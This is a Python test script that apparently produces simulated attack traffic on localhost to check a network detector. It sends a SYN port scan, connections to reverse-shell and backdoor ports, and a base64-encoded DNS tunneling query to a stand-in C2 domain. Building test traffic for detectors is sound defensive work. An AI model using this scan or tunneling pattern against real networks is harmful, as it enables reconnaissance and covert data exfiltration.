import time
from scapy.all import IP, TCP, UDP, DNS, DNSQR, send

print("=" * 60)
print("  Test Traffic Generator")
print("  Make sure detector.py is running in another terminal.")
print("=" * 60)
print()

# Test 1: Port scan simulation (T1046)
print("[Test 1] Simulating port scan on localhost...")
for port in [22, 80, 443, 8080, 3306, 5432, 6379, 27017]:
    send(IP(dst="127.0.0.1") / TCP(dport=port, flags="S"), verbose=False)
print("  Sent SYN packets to 8 ports on 127.0.0.1")

time.sleep(2)

# Test 2: Suspicious port connection (T1071.001)
print("[Test 2] Simulating connection to suspicious port 4444...")
send(IP(dst="127.0.0.1") / TCP(dport=4444, flags="S"), verbose=False)
print("  Sent SYN to port 4444 (common reverse shell port)")

time.sleep(1)

# Test 3: Another suspicious port (T1071.001)
print("[Test 3] Simulating connection to suspicious port 31337...")
send(IP(dst="127.0.0.1") / TCP(dport=31337, flags="S"), verbose=False)
print("  Sent SYN to port 31337 (classic backdoor port)")
time.sleep(1)

# Test 4: DNS tunneling simulation (T1071.004)
print("[Test 4] Simulating DNS tunneling query...")
tunneling_query = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil-c2.example.com."
send(
    IP(dst="127.0.0.1") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=tunneling_query)),
    verbose=False,
)
print(f"  Sent encoded DNS query: {tunneling_query[:50]}...")
print()
print("Done! Check detector.py output for alerts.")